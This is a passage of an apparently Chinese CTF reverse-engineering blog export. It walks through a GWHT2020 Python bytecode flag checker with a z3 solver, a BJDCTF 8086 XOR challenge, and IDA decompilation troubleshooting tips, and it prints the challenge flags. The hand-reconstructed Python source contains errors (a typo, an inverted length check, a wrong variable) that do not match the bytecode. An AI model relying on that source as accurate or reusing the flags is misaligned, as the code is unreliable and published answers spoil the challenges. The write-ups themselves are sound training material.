class="line">            122 STORE_NAME               3 (flag)</span><br><span class="line">input(flag)</span><br><span class="line"></span><br><span class="line"> 10         125 LOAD_NAME                3 (flag)</span><br><span class="line">            128 STORE_NAME               4 (str)</span><br><span class="line">str&#x3D;flag</span><br><span class="line"></span><br><span class="line"> 12         131 LOAD_NAME                5 (len)</span><br><span class="line">            134 LOAD_NAME                4 (str)</span><br><span class="line">            137 CALL_FUNCTION            1</span><br><span class="line">            140 STORE_NAME               6 (a)</span><br><span class="line">a&#x3D;len(str)</span><br><span class="line"></span><br><span class="line"> 13         143 LOAD_NAME                6 (a)</span><br><span class="line">            146 LOAD_CONST              30 (38)</span><br><span class="line">            149 COMPARE_OP               0 (&lt;)</span><br><span class="line">            152 POP_JUMP_IF_FALSE      173</span><br><span class="line">if(a&lt;38)  </span><br><span class="line">    jump to 173</span><br><span class="line"></span><br><span class="line"> 14         155 LOAD_CONST              31 (&#39;lenth wrong!&#39;)</span><br><span class="line">            158 PRINT_ITEM          </span><br><span class="line">            159 PRINT_NEWLINE       </span><br><span class="line"></span><br><span class="line"> 15         160 LOAD_NAME                7 (exit)</span><br><span class="line">            163 LOAD_CONST              32 (0)</span><br><span class="line">            166 CALL_FUNCTION            1</span><br><span class="line">            169 POP_TOP             </span><br><span class="line">            170 JUMP_FORWARD             0 (to 173)</span><br><span class="line"></span><br><span class="line"> 17     &gt;&gt;  173 LOAD_NAME                8 (ord)</span><br><span class="line">            176 LOAD_NAME                4 (str)</span><br><span class="line">            179 LOAD_CONST              32 (0)</span><br><span class="line">            182 BINARY_SUBSCR       </span><br><span class="line">            183 CALL_FUNCTION            1</span><br><span class="line">            186 LOAD_CONST              33 (2020)</span><br><span class="line">            189 BINARY_MULTIPLY                         str[0]*2020</span><br><span class="line">            190 LOAD_NAME                8 (ord)</span><br><span class="line">            193 LOAD_NAME                4 (str)</span><br><span class="line">            196 LOAD_CONST              34 (1)</span><br><span class="line">            199 BINARY_SUBSCR       </span><br><span class="line">            200 CALL_FUNCTION            1</span><br><span class="line">            203 BINARY_ADD          </span><br><span class="line">            204 LOAD_CONST              33 (2020)</span><br><span class="line">            207 BINARY_MULTIPLY                         (str[0]*2020+str[1])*2020     </span><br><span class="line">            208 LOAD_NAME                8 (ord)</span><br><span class="line">            211 LOAD_NAME                4 (str)</span><br><span class="line">            214 LOAD_CONST              35 (2)</span><br><span class="line">            217 BINARY_SUBSCR       </span><br><span class="line">            218 CALL_FUNCTION            1</span><br><span class="line">            221 BINARY_ADD          </span><br><span class="line">            222 LOAD_CONST              33 (2020)</span><br><span class="line">            225 BINARY_MULTIPLY     </span><br><span class="line">            226 LOAD_NAME                8 (ord)</span><br><span class="line">            229 LOAD_NAME                4 (str)</span><br><span class="line">            232 LOAD_CONST               0 (3)</span><br><span class="line">            235 BINARY_SUBSCR       </span><br><span class="line">            236 CALL_FUNCTION            1</span><br><span class="line">            239 BINARY_ADD          </span><br><span class="line">            240 LOAD_CONST              33 (2020)</span><br><span class="line">            243 BINARY_MULTIPLY     </span><br><span class="line">            244 LOAD_NAME                8 (ord)</span><br><span class="line">            247 LOAD_NAME                4 (str)</span><br><span class="line">            250 LOAD_CONST              36 (4)</span><br><span class="line">            253 BINARY_SUBSCR       </span><br><span class="line">            254 CALL_FUNCTION            1</span><br><span class="line">            257 BINARY_ADD          </span><br><span class="line">            258 LOAD_CONST              37 (1182843538814603)</span><br><span class="line">            261 COMPARE_OP               2 (&#x3D;&#x3D;)</span><br><span class="line">            264 POP_JUMP_IF_FALSE      275</span><br><span class="line">if(((((str[0]*2020+str[1])*2020+str[2])*2020+str[3])*2020+str[4])!&#x3D;1182843538814603)</span><br><span class="line">    jump to 275</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> 18         267 LOAD_CONST              38 (&#39;good!continue\xe2\x80\xa6\xe2\x80\xa6&#39;)</span><br><span class="line">            270 PRINT_ITEM          </span><br><span class="line">            271 PRINT_NEWLINE       </span><br><span class="line">            272 JUMP_FORWARD            15 (to 290)</span><br><span class="line"></span><br><span class="line"> 20     &gt;&gt;  275 LOAD_CONST              39 (&#39;bye~&#39;)</span><br><span class="line">            278 PRINT_ITEM          </span><br><span class="line">            279 PRINT_NEWLINE       </span><br><span class="line"></span><br><span class="line"> 21         280 LOAD_NAME                7 (exit)</span><br><span class="line">            283 LOAD_CONST              32 (0)</span><br><span class="line">            286 CALL_FUNCTION            1</span><br><span class="line">            289 POP_TOP             </span><br><span class="line"></span><br><span class="line"> 23     &gt;&gt;  290 BUILD_LIST               0</span><br><span class="line">            293 STORE_NAME               9 (x)</span><br><span class="line"></span><br><span class="line"> 24         296 LOAD_CONST              40 (5)</span><br><span class="line">            299 STORE_NAME              10 (k)          k&#x3D;5</span><br><span class="line"></span><br><span class="line"> 25         302 SETUP_LOOP             128 (to 433)</span><br><span class="line">            305 LOAD_NAME               11 (range)</span><br><span class="line">            308 LOAD_CONST              41 (13)         range(13)</span><br><span class="line">            311 CALL_FUNCTION            1</span><br><span class="line">            314 GET_ITER            </span><br><span class="line">        &gt;&gt;  315 FOR_ITER               114 (to 432)</span><br><span class="line">            318 STORE_NAME              12 (i)</span><br><span class="line"></span><br><span class="line"> 26         321 LOAD_NAME                8 (ord)</span><br><span class="line">            324 LOAD_NAME                4 (str)</span><br><span class="line">            327 LOAD_NAME               10 (k)</span><br><span class="line">            330 BINARY_SUBSCR       </span><br><span class="line">            331 CALL_FUNCTION            1</span><br><span class="line">            334 STORE_NAME              13 (b)          b&#x3D;ord(str[k])</span><br><span class="line"></span><br><span class="line"> 27         337 LOAD_NAME                8 (ord)</span><br><span class="line">            340 LOAD_NAME                4 (str)</span><br><span class="line">            343 LOAD_NAME               10 (k)</span><br><span class="line">            346 LOAD_CONST              34 (1)</span><br><span class="line">            349 BINARY_ADD          </span><br><span class="line">            350 BINARY_SUBSCR       </span><br><span class="line">            351 CALL_FUNCTION            1</span><br><span class="line">            354 STORE_NAME              14 (c)          c&#x3D;ord(str[k+1])</span><br><span class="line"></span><br><span class="line"> 28         357 LOAD_NAME               14 (c)</span><br><span class="line">            360 LOAD_NAME                0 (en)</span><br><span class="line">            363 LOAD_NAME               12 (i)</span><br><span class="line">            366 LOAD_CONST               4 (6)</span><br><span class="line">            369 BINARY_MODULO                    </span><br><span class="line">            370 BINARY_SUBSCR       </span><br><span class="line">            371 BINARY_XOR                              </span><br><span class="line">            372 STORE_NAME              15 (a11)        a11&#x3D;c^en[i%6]</span><br><span class="line"></span><br><span class="line"> 29         375 LOAD_NAME               13 (b)</span><br><span class="line">            378 LOAD_NAME                0 (en)</span><br><span class="line">            381 LOAD_NAME               12 (i)</span><br><span class="line">            384 LOAD_CONST               4 (6)</span><br><span class="line">            387 BINARY_MODULO       </span><br><span class="line">            388 BINARY_SUBSCR       </span><br><span class="line">            389 BINARY_XOR          </span><br><span class="line">            390 STORE_NAME              16 (a22)        a22&#x3D;c^en[i%6]</span><br><span class="line"></span><br><span class="line"> 30         393 LOAD_NAME                9 (x)</span><br><span class="line">            396 LOAD_ATTR               17 (append)</span><br><span class="line">            399 LOAD_NAME               15 (a11)        x.append(a11)</span><br><span class="line">            402 CALL_FUNCTION            1</span><br><span class="line">            405 POP_TOP             </span><br><span class="line"></span><br><span class="line"> 31         406 LOAD_NAME                9 (x)</span><br><span class="line">            409 LOAD_ATTR               17 (append)</span><br><span class="line">            412 LOAD_NAME               16 (a22)        x.append(a22)</span><br><span class="line">            415 CALL_FUNCTION            1</span><br><span class="line">            418 POP_TOP             </span><br><span class="line"></span><br><span class="line"> 32         419 LOAD_NAME               10 (k)</span><br><span class="line">            422 LOAD_CONST              35 (2)</span><br><span class="line">            425 INPLACE_ADD                           </span><br><span class="line">            426 STORE_NAME              10 (k)          k+&#x3D;2</span><br><span class="line">            429 JUMP_ABSOLUTE          315</span><br><span class="line">        &gt;&gt;  432 POP_BLOCK           </span><br><span class="line"></span><br><span class="line"> 33     &gt;&gt;  433 LOAD_NAME                9 (x)</span><br><span class="line">            436 LOAD_NAME                1 (output)</span><br><span class="line">            439 COMPARE_OP               2 (&#x3D;&#x3D;)</span><br><span class="line">            442 POP_JUMP_IF_FALSE      453</span><br><span class="line">if(x!&#x3D;output)</span><br><span class="line">    jump to 453</span><br><span class="line"></span><br><span class="line"> 34         445 LOAD_CONST              38 (&#39;good!continue\xe2\x80\xa6\xe2\x80\xa6&#39;)</span><br><span class="line">            448 PRINT_ITEM          </span><br><span class="line">            449 PRINT_NEWLINE       </span><br><span class="line">            450 JUMP_FORWARD            15 (to 468)</span><br><span class="line"></span><br><span class="line"> 36     &gt;&gt;  453 LOAD_CONST              42 (&#39;oh,you are wrong!&#39;)</span><br><span class="line">            456 PRINT_ITEM          </span><br><span class="line">            457 PRINT_NEWLINE       </span><br><span class="line"></span><br><span class="line"> 37         458 LOAD_NAME                7 (exit)</span><br><span class="line">            461 LOAD_CONST              32 (0)</span><br><span class="line">            464 CALL_FUNCTION            1</span><br><span class="line">            467 POP_TOP             </span><br><span class="line"></span><br><span class="line"> 39     &gt;&gt;  468 LOAD_NAME                5 (len)</span><br><span class="line">            471 LOAD_NAME                4 (str)</span><br><span class="line">            474 CALL_FUNCTION            1</span><br><span class="line">            477 STORE_NAME              18 (l)          l&#x3D;len(str)</span><br><span class="line"></span><br><span class="line"> 40         480 LOAD_NAME                8 (ord)</span><br><span class="line">            483 LOAD_NAME                4 (str)</span><br><span class="line">            486 LOAD_NAME               18 (l)</span><br><span class="line">            489 LOAD_CONST              43 (7)</span><br><span class="line">            492 BINARY_SUBTRACT     </span><br><span class="line">            493 BINARY_SUBSCR                           </span><br><span class="line">            494 CALL_FUNCTION            1</span><br><span class="line">            497 STORE_NAME              19 (a1)         a1&#x3D;ord(str[l-7])</span><br><span class="line"></span><br><span class="line"> 41         500 LOAD_NAME                8 (ord)</span><br><span class="line">            503 LOAD_NAME                4 (str)</span><br><span class="line">            506 LOAD_NAME               18 (l)</span><br><span class="line">            509 LOAD_CONST               4 (6)</span><br><span class="line">            512 BINARY_SUBTRACT     </span><br><span class="line">            513 BINARY_SUBSCR       </span><br><span class="line">            514 CALL_FUNCTION            1</span><br><span class="line">            517 STORE_NAME              20 (a2)         a2&#x3D;ord(str[l-6])</span><br><span class="line"></span><br><span class="line"> 42         520 LOAD_NAME                8 (ord)</span><br><span class="line">            523 LOAD_NAME                4 (str)</span><br><span class="line">            526 LOAD_NAME               18 (l)</span><br><span class="line">            529 LOAD_CONST              40 (5)</span><br><span class="line">            532 BINARY_SUBTRACT     </span><br><span class="line">            533 BINARY_SUBSCR       </span><br><span class="line">            534 CALL_FUNCTION            1</span><br><span class="line">            537 STORE_NAME              21 (a3)</span><br><span class="line"></span><br><span class="line"> 43         540 LOAD_NAME                8 (ord)</span><br><span class="line">            543 LOAD_NAME                4 (str)</span><br><span class="line">            546 LOAD_NAME               18 (l)</span><br><span class="line">            549 LOAD_CONST              36 (4)</span><br><span class="line">            552 BINARY_SUBTRACT     </span><br><span class="line">            553 BINARY_SUBSCR       </span><br><span class="line">            554 CALL_FUNCTION            1</span><br><span class="line">            557 STORE_NAME              22 (a4)</span><br><span class="line"></span><br><span class="line"> 44         560 LOAD_NAME                8 (ord)</span><br><span class="line">            563 LOAD_NAME                4 (str)</span><br><span class="line">            566 LOAD_NAME               18 (l)</span><br><span class="line">            569 LOAD_CONST               0 (3)</span><br><span class="line">            572 BINARY_SUBTRACT     </span><br><span class="line">            573 BINARY_SUBSCR       </span><br><span class="line">            574 CALL_FUNCTION            1</span><br><span class="line">            577 STORE_NAME              23 (a5)</span><br><span class="line"></span><br><span class="line"> 45         580 LOAD_NAME                8 (ord)</span><br><span class="line">            583 LOAD_NAME                4 (str)</span><br><span class="line">            586 LOAD_NAME               18 (l)</span><br><span class="line">            589 LOAD_CONST              35 (2)</span><br><span class="line">            592 BINARY_SUBTRACT     </span><br><span class="line">            593 BINARY_SUBSCR       </span><br><span class="line">            594 CALL_FUNCTION            1</span><br><span class="line">            597 STORE_NAME              24 (a6)</span><br><span class="line"></span><br><span class="line"> 46         600 LOAD_NAME               19 (a1)</span><br><span class="line">            603 LOAD_CONST               0 (3)</span><br><span class="line">            606 BINARY_MULTIPLY     </span><br><span class="line">            607 LOAD_NAME               20 (a2)</span><br><span class="line">            610 LOAD_CONST              35 (2)</span><br><span class="line">            613 BINARY_MULTIPLY         </span><br><span class="line">            614 BINARY_ADD          </span><br><span class="line">            615 LOAD_NAME               21 (a3)</span><br><span class="line">            618 LOAD_CONST              40 (5)</span><br><span class="line">            621 BINARY_MULTIPLY     </span><br><span class="line">            622 BINARY_ADD          </span><br><span class="line">            623 LOAD_CONST              44 (1003)</span><br><span class="line">            626 COMPARE_OP               2 (&#x3D;&#x3D;)</span><br><span class="line">            629 POP_JUMP_IF_FALSE      807</span><br><span class="line">if((a[1]*3+a[2]*2+a[3]*5)!&#x3D;1003)</span><br><span class="line">    jump to 807</span><br><span class="line"></span><br><span class="line"> 47         632 LOAD_NAME               19 (a1)</span><br><span class="line">            635 LOAD_CONST              36 (4)</span><br><span class="line">            638 BINARY_MULTIPLY     </span><br><span class="line">            639 LOAD_NAME               20 (a2)</span><br><span class="line">            642 LOAD_CONST              43 (7)</span><br><span class="line">            645 BINARY_MULTIPLY     </span><br><span class="line">            646 BINARY_ADD          </span><br><span class="line">            647 LOAD_NAME               21 (a3)</span><br><span class="line">            650 LOAD_CONST               3 (9)</span><br><span class="line">            653 BINARY_MULTIPLY     </span><br><span class="line">            654 BINARY_ADD          </span><br><span class="line">            655 LOAD_CONST              45 (2013)</span><br><span class="line">            658 COMPARE_OP               2 (&#x3D;&#x3D;)</span><br><span class="line">            661 POP_JUMP_IF_FALSE      807</span><br><span class="line"></span><br><span class="line"> 48         664 LOAD_NAME               19 (a1)</span><br><span class="line">            667 LOAD_NAME               20 (a2)</span><br><span class="line">            670 LOAD_CONST              46 (8)</span><br><span class="line">            673 BINARY_MULTIPLY     </span><br><span class="line">            674 BINARY_ADD          </span><br><span class="line">            675 LOAD_NAME               21 (a3)</span><br><span class="line">            678 LOAD_CONST              35 (2)</span><br><span class="line">            681 BINARY_MULTIPLY     </span><br><span class="line">            682 BINARY_ADD          </span><br><span class="line">            683 LOAD_CONST              47 (1109)</span><br><span class="line">            686 COMPARE_OP               2 (&#x3D;&#x3D;)</span><br><span class="line">            689 POP_JUMP_IF_FALSE      804</span><br><span class="line"></span><br><span class="line"> 49         692 LOAD_NAME               22 (a4)</span><br><span class="line">            695 LOAD_CONST               0 (3)</span><br><span class="line">            698 BINARY_MULTIPLY     </span><br><span class="line">            699 LOAD_NAME               23 (a5)</span><br><span class="line">            702 LOAD_CONST              35 (2)</span><br><span class="line">            705 BINARY_MULTIPLY     </span><br><span class="line">            706 BINARY_ADD          </span><br><span class="line">            707 LOAD_NAME               24 (a6)</span><br><span class="line">            710 LOAD_CONST              40 (5)</span><br><span class="line">            713 BINARY_MULTIPLY     </span><br><span class="line">            714 BINARY_ADD          </span><br><span class="line">            715 LOAD_CONST              48 (671)</span><br><span class="line">            718 COMPARE_OP               2 (&#x3D;&#x3D;)</span><br><span class="line">            721 POP_JUMP_IF_FALSE      801</span><br><span class="line"></span><br><span class="line"> 50         724 LOAD_NAME               22 (a4)</span><br><span class="line">            727 LOAD_CONST              36 (4)</span><br><span class="line">            730 BINARY_MULTIPLY     </span><br><span class="line">            731 LOAD_NAME               23 (a5)</span><br><span class="line">            734 LOAD_CONST              43 (7)</span><br><span class="line">            737 BINARY_MULTIPLY     </span><br><span class="line">            738 BINARY_ADD          </span><br><span class="line">            739 LOAD_NAME               24 (a6)</span><br><span class="line">            742 LOAD_CONST               3 (9)</span><br><span class="line">            745 BINARY_MULTIPLY     </span><br><span class="line">            746 BINARY_ADD          </span><br><span class="line">            747 LOAD_CONST              49 (1252)</span><br><span class="line">            750 COMPARE_OP               2 (&#x3D;&#x3D;)</span><br><span class="line">            753 POP_JUMP_IF_FALSE      798</span><br><span class="line"></span><br><span class="line"> 51         756 LOAD_NAME               22 (a4)</span><br><span class="line">            759 LOAD_NAME               23 (a5)</span><br><span class="line">            762 LOAD_CONST              46 (8)</span><br><span class="line">            765 BINARY_MULTIPLY     </span><br><span class="line">            766 BINARY_ADD          </span><br><span class="line">            767 LOAD_NAME               24 (a6)</span><br><span class="line">            770 LOAD_CONST              35 (2)</span><br><span class="line">            773 BINARY_MULTIPLY     </span><br><span class="line">            774 BINARY_ADD          </span><br><span class="line">            775 LOAD_CONST              50 (644)</span><br><span class="line">            778 COMPARE_OP               2 (&#x3D;&#x3D;)</span><br><span class="line">            781 POP_JUMP_IF_FALSE      795</span><br><span class="line"></span><br><span class="line"> 52         784 LOAD_CONST              51 (&#39;congraduation!you get the right flag!&#39;)</span><br><span class="line">            787 PRINT_ITEM          </span><br><span class="line">            788 PRINT_NEWLINE       </span><br><span class="line">            789 JUMP_ABSOLUTE          795</span><br><span class="line">            792 JUMP_ABSOLUTE          798</span><br><span class="line">        &gt;&gt;  795 JUMP_ABSOLUTE          801</span><br><span class="line">        &gt;&gt;  798 JUMP_ABSOLUTE          804</span><br><span class="line">        &gt;&gt;  801 JUMP_ABSOLUTE          807</span><br><span class="line">        &gt;&gt;  804 JUMP_FORWARD             0 (to 807)</span><br><span class="line">        &gt;&gt;  807 LOAD_CONST              52 (None)</span><br><span class="line">            810 RETURN_VALUE </span><br></pre></td></tr></table></figure><blockquote><p>python源码</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">en&#x3D;[3,37,72,9,6,132]</span><br><span class="line">output&#x3D;[101, 96, 23, 68, 112, 42, 107, 62, 96, 53, 176, 179, 98, 53, 67, 29, 41, 120, 60, 106, 51, 101, 178, 189, 101, 48]</span><br><span class="line">print(&#39;welcome to GWHT2020&#39;)</span><br><span class="line">flag&#x3D;raw_input(&#39;please input your flag:&#39;)</span><br><span class="line">str&#x3D;flag</span><br><span class="line">a&#x3D;len(str)</span><br><span class="line">if a&gt;&#x3D;38:</span><br><span class="line">peint(&#39;lenth wrong!&#39;)</span><br><span class="line">exit(0)</span><br><span class="line">if((((ord(str[1])+2020*ord(str[0]))*2020+ord(str[2]))*2020+ord(str[3]))*2020+ord(str[4])!&#x3D;1182843538814603):</span><br><span class="line">print(&#39;bye~&#39;)</span><br><span class="line">exit(0)</span><br><span class="line">print(&#39;good!continue\xe2\x80\xa6\xe2\x80\xa6&#39;)</span><br><span class="line">k&#x3D;5</span><br><span class="line">for i in range(13):</span><br><span class="line">b&#x3D;ord(str[k])</span><br><span class="line">c&#x3D;ord(str[k+1])</span><br><span class="line">a11&#x3D;c^en[i%6]</span><br><span class="line">a22&#x3D;c^en[i%6]</span><br><span class="line">x.append(a11)</span><br><span class="line">x.append(a22)</span><br><span class="line">k+&#x3D;2</span><br><span class="line">if x!&#x3D;output:</span><br><span class="line">print(&#39;oh,you are wrong!&#39;)</span><br><span class="line">exit(0)</span><br><span class="line">l&#x3D;len(str)</span><br><span class="line">a1&#x3D;ord(str[l-7])</span><br><span class="line">a2&#x3D;ord(str[l-6])</span><br><span class="line">a3&#x3D;ord(str[l-5])</span><br><span class="line">a4&#x3D;ord(str[l-4])</span><br><span class="line">a5&#x3D;ord(str[l-3])</span><br><span class="line">a6&#x3D;ord(str[l-2])</span><br><span class="line">if((a1*3+a2*2+a3*5&#x3D;&#x3D;1003)&amp;(a1*4+a2*7+a3*9&#x3D;&#x3D;2013)&amp;(a1+a2*8+a3*2&#x3D;&#x3D;1109)&amp;(a4*3+a5*2+a6*5&#x3D;&#x3D;671)&amp;(a4*4+a5*7+a6*9&#x3D;&#x3D;1252)&amp;(a4+a5*8+a6*2&#x3D;&#x3D;644)):</span><br><span class="line">print(&#39;congraduation!you get the right flag!&#39;)</span><br></pre></td></tr></table></figure><blockquote><p>exp</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">en&#x3D;[3,37,72,9,6,132]</span><br><span class="line">output&#x3D;[101,96,23,68,112,42,107,62,96,53,176,179,98,53,67,29,41,120,60,106,51,101,178,189,101,48]</span><br><span class="line">x &#x3D; Solver()</span><br><span class="line">a1,a2,a3,a4,a5&#x3D;Ints(&quot;a1 a2 a3 a4 a5&quot;)</span><br><span class="line">x.add((((a1*2020+a2)*2020+a3)*2020+a4)*2020+a5&#x3D;&#x3D;1182843538814603)</span><br><span class="line">x.add(a1&gt;31,a2&gt;31,a3&gt;31,a4&gt;31,a5&gt;31)</span><br><span class="line">x.add(a1&lt;127,a2&lt;127,a3&lt;127,a4&lt;127,a5&lt;127)</span><br><span class="line">if x.check()&#x3D;&#x3D;sat:</span><br><span class="line">    print(x.model())</span><br><span class="line">a&#x3D;[71,87,72,84,123]</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in a:</span><br><span class="line">    flag+&#x3D;chr(i)</span><br><span class="line">print(flag)</span><br><span class="line">b&#x3D;[]</span><br><span class="line">k&#x3D;0</span><br><span class="line">for i in range(13):</span><br><span class="line">    b.append(output[k+1]^en[i%6])</span><br><span class="line">    b.append(output[k]^en[i%6])</span><br><span class="line">    k+&#x3D;2</span><br><span class="line">for i in b:</span><br><span class="line">    flag+&#x3D;chr(i)</span><br><span class="line">print(flag)</span><br><span class="line">xx &#x3D; Solver()</span><br><span class="line">a1,a2,a3,a4,a5,a6&#x3D;Ints(&quot;a1 a2 a3 a4 a5 a6&quot;)</span><br><span class="line">xx.add(a1*3+a2*2+a3*5&#x3D;&#x3D;1003)</span><br><span class="line">xx.add(a1*4+a2*7+a3*9&#x3D;&#x3D;2013)</span><br><span class="line">xx.add(a1+a2*8+a3*2&#x3D;&#x3D;1109)</span><br><span class="line">xx.add(a4*3+a5*2+a6*5&#x3D;&#x3D;671)</span><br><span class="line">xx.add(a4*4+a5*7+a6*9&#x3D;&#x3D;1252)</span><br><span class="line">xx.add(a4+a5*8+a6*2&#x3D;&#x3D;644)</span><br><span class="line">if xx.check()&#x3D;&#x3D;sat:</span><br><span class="line">    print(xx.model())</span><br><span class="line">c&#x3D;[97,101,102,102,55,51]</span><br><span class="line">for i in c:</span><br><span class="line">    flag+&#x3D;chr(i)</span><br><span class="line">flag+&#x3D;&#39;&#125;&#39;</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><blockquote><p>flag{cfa2b87b3f746a8f0ac5c5963faeff73}</p></blockquote><h1 id="BJDCTF-2nd-8086"><a href="#BJDCTF-2nd-8086" class="headerlink" title="[BJDCTF 2nd]8086"></a>[BJDCTF 2nd]8086</h1><p><a href="https://buuoj.cn/challenges#[BJDCTF%202nd]8086">题目链接</a><br>拖入64位ida中</p><p><img src="/2021/04/16/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/1.PNG"></p><p>只有一串字符、一个死循环和一堆数据。<br>将里面的数据强制转换为代码</p><p><img src="/2021/04/16/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/2.PNG"></p><p>是一个异或</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char flag[]&#x3D;&quot;]U[du~|t@&#123;z@wj.&#125;.~q@gjz&#123;z@wzqW~&#x2F;b;&quot;; </span><br><span class="line">    int i;</span><br><span class="line">    for(i&#x3D;0;i&lt;0x22;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i]^&#x3D;0x1f; </span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;%s&quot;,flag);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{jack_de_hu1b1an_xuede_henHa0}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ida无法f5解决方案</title>
      <link href="2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
      <url>2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<h1 id="call-analysis-failed"><a href="#call-analysis-failed" class="headerlink" title="call analysis failed"></a>call analysis failed</h1><a id="more"></a><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/1.PNG"></p><p>按下space键，找到错误地址：401095<br>进入call后面的函数</p><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/2.PNG"></p><p>选中整个函数，按‘d’转为数据，然后按下‘c’转换为代码</p><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/3.PNG"></p><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/4.PNG"></p><p>返回原来函数中，就可以f5了</p><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/5.PNG"></p><h1 id="无法选中函数"><a href="#无法选中函数" class="headerlink" title="无法选中函数"></a>无法选中函数</h1><p>找到了main函数，f5却显示没有选中函数</p><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/6.PNG"></p><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/7.PNG"></p><p>这里是main函数没有被识别<br>选中前面地址为红色的代码，按下‘p’，main函数就有了。</p><h1 id="positive-sp-value-has-been-found"><a href="#positive-sp-value-has-been-found" class="headerlink" title="positive sp value has been found"></a>positive sp value has been found</h1><p>堆栈不平衡导致</p><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/8.PNG"></p><p>打开选项中的常规（Options中的第一个），勾选上堆栈指针选项</p><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/9.PNG"></p><p>确定后界面是这样的</p><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/10.PNG"></p><p>选中图中指令部分(图中高亮代码)，按下 alt+k 更改堆栈指针，知道前面的堆栈指针均为正式且retn前堆栈指针值为0时就成功了。</p><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/11.PNG"></p><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/12.PNG"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>将python打包的.exe文件还原成.py文件</title>
      <link href="2021/04/11/%E5%B0%86python%E6%89%93%E5%8C%85%E7%9A%84-exe%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F%E6%88%90-py%E6%96%87%E4%BB%B6/"/>
